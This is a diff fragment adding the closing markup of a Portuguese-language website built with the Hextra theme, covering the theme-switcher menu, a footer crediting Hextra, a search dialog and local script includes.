+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div><hr class="hx:border-gray-200 hx:dark:border-neutral-800" /><div class="hextra-custom-footer hextra-max-footer-width hx:mx-auto hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Com a tecnologia de Hextra<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <dialog
+    id="hextra-search-dialog"
+    class="hextra-search-dialog"
+    aria-label="Procurar..."
+  >
+    <div class="hextra-search">
+      <div class="hextra-search-input-wrapper"><svg class="hextra-search-input-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><input
+          class="hextra-search-input"
+          type="search"
+          role="combobox"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          placeholder="Procurar..."
+          aria-label="Procurar..."
+          aria-controls="hextra-search-results"
+          aria-expanded="false"
+        /><button
+          type="button"
+          class="hextra-search-input-kbd"
+          data-search-close
+          aria-label="Close"
+        >ESC</button>
+      </div>
+      <div class="hextra-search-results-viewport" data-search-viewport>
+        <div class="hextra-search-results-inner hextra-scrollbar" data-search-inner>
+          <ul
+            id="hextra-search-results"
+            class="hextra-search-results"
+            role="listbox"
+            aria-label="Resultados da pesquisa"
+          ></ul>
+          <div class="hextra-search-empty" data-search-empty hidden>Nenhum resultado encontrado</div>
+        </div>
+      </div>
+      <div class="hextra-search-status hx:sr-only" aria-live="polite" role="status"></div>
+    </div>
+  </dialog>
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script><script defer src="/pt.search.js" integrity=""></script>
+    <script defer src="/pt.search-dialog.js" integrity=""></script>
+  </body>
+</html>
